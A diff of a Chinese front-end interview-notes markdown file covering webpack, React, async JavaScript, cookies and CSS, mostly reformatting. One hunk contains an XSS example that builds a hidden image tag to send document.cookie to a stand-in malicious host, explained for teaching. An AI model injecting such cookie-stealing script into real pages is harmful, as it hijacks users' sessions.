@@ -112,7 +112,7 @@ A loader is a node module exporting a function.
 #### 打包原理
 
 webpack打包，最基本的实现方式，是将所有的模块代码放到一个数组里，通过数组ID来引用不同的模块
-```
+```javascript
 /************************************************************************/
 /******/ ([
 /* 0 */
@@ -169,6 +169,7 @@ HelloWorldPlugin.prototype.apply = function(compiler) {
 module.exports = HelloWorldPlugin;
 ```
 #### webpack打包后文件体积过大怎么办？
+
 很多方法：异步加载模块（代码分割）；提取第三方库（使用cdn或者vender）；代码压缩；去除不必要的插件；去除devtool选项，dllplugin等等。
 
 ### 移动端问题
@@ -298,7 +299,7 @@ http://react-china.org/t/dom/638
 
 2.子组件向父组件通讯，可以通过父组件定义事件（回调函数），子组件调用该函数，通过实参的形式来改变父组件的数据来通信
 
-```
+```javascript
 //子组件
 this.props.onCommentSubmit({author, content, date:new Date().getTime()});
 //父组件
@@ -391,7 +392,7 @@ React 实现了一个“合成事件”层（synthetic event system），这个�
 
 #### react组件生命周期
 
-![Alt text](./1501943817143.png)
+![](imgs/lifecycle.jpeg)
 
 react组件更新过程：
 
@@ -577,8 +578,9 @@ window.history.replaceState(stateObject, title, URL)
 为了设计私有方法和变量，避免全局变量污染
 希望一个变量长期驻扎在内存中
 
+### 异步相关
 
-### async，Promise，Generator函数，co函数库区别
+#### async，Promise，Generator函数，co函数库区别
 
 `async...await`写法最简洁，最符合语义。async/await让异步代码看起来、表现起来更像同步代码，这正是其威力所在。async 函数就是 Generator 函数的语法糖，只不过async内置了自动执行器。async 函数就是将 Generator 函数的星号（*）替换成 async，将 yield 替换成 await
 
@@ -616,6 +618,21 @@ promise.catch();
 // 等价于
 promise.then(null, function(reason){});
 ```
+
+有许多场景是异步的：
+1.事件监听，如click，onload等事件
+2.定时器  setTimeout和setInterval
+3.ajax请求
+
+js异步编程模型（es5）：
+
+- 回调函数（callback）陷入回调地狱，解耦程度特别低
+- 事件监听（Listener）JS 和浏览器提供的原生方法基本都是基于事件触发机制的
+- 发布/订阅（观察者模式）把事件全部交给控制器管理，可以完全掌握事件被订阅的次数，以及订阅者的信息，管理起来特别方便。
+- Promise 对象实现方式
+
+async函数与Promise、Generator函数一样，是用来取代回调函数、解决异步操作的一种方法。它本质上是Generator函数的语法糖。
+Promise，generator/yield，await/async 都是现在和未来 JS 解决异步的标准做法
 
 ### Restful
 
@@ -772,22 +789,7 @@ cookie的属性：
 
 浏览器的同源政策规定，两个网址只要域名相同和端口相同，就可以共享Cookie。
 
-### 异步
 
-有许多场景是异步的：
-1.事件监听，如click，onload等事件
-2.定时器  setTimeout和setInterval
-3.ajax请求
-
-js异步编程模型（es5）：
-
-- 回调函数（callback）陷入回调地狱，解耦程度特别低
-- 事件监听（Listener）JS 和浏览器提供的原生方法基本都是基于事件触发机制的
-- 发布/订阅（观察者模式）把事件全部交给控制器管理，可以完全掌握事件被订阅的次数，以及订阅者的信息，管理起来特别方便。
-- Promise 对象实现方式
-
-async函数与Promise、Generator函数一样，是用来取代回调函数、解决异步操作的一种方法。它本质上是Generator函数的语法糖。
-Promise，generator/yield，await/async 都是现在和未来 JS 解决异步的标准做法
 
 ### 什么是同构
 
@@ -1296,7 +1298,7 @@ img.src='http://www.xss.com?cookie='+document.cookie;
 img.style.display='none';
 document.getElementsByTagName('body')[0].appendChild(img);
 
-//这样就神不知鬼不觉的把当前用户的cookie发送给了我的恶意站点，我的恶意站点通过获取get参数就拿到了用户的cookie。当然我们可以通过这个方法拿到用户各种各样的数据。
+这样就神不知鬼不觉的把当前用户的cookie发送给了我的恶意站点，我的恶意站点通过获取get参数就拿到了用户的cookie。当然我们可以通过这个方法拿到用户各种各样的数据。
 ```
 
 目前很多浏览器都会自身对用户的输入进行判断，检测是否存在攻击字符，比如你上述提到的`<script>`标签，这段脚本很明显就是一段xss攻击向量，因此浏览器会对这段输入进行处理，不同的浏览器处理方式也不一样。可以在浏览器中将这个拦截关闭
@@ -1546,7 +1548,7 @@ new Animal('cat')=function(){
 
 #### box-sizing盒模型
 
-![Alt text](./1503235984536.png)
+
 
 box-sizing属性主要用来控制元素的盒模型的解析模式。默认值是content-box。
 
@@ -1622,6 +1624,8 @@ display: -webkit-box;
 -webkit-box-pack: center;
 ```
 
+for detail: https://github.com/hawx1993/tech-blog/issues/12
+
 #### 实现左边定宽右边自适应效果
 
 1.table(父级元素)与tabel-cell（两个子集元素）
@@ -1643,8 +1647,11 @@ display: -webkit-box;
 下列情况将创建一个块格式化上下文：
 
 ① float
+
 ② overflow
+
 ③ display（display为inline-block、table-cell）
+
 ④ position（absolute 或 fixed）
 
 
@@ -1706,6 +1713,6 @@ css3使用
 
 #### css实现自适应正方形
 
-方案一：CSS3 vw 单位
-方案二：设置垂直方向的padding撑开容器
-方案三：利用伪元素的 margin(padding)-top 撑开容器
+- 方案一：CSS3 vw 单位
+- 方案二：设置垂直方向的padding撑开容器
+- 方案三：利用伪元素的 margin(padding)-top 撑开容器
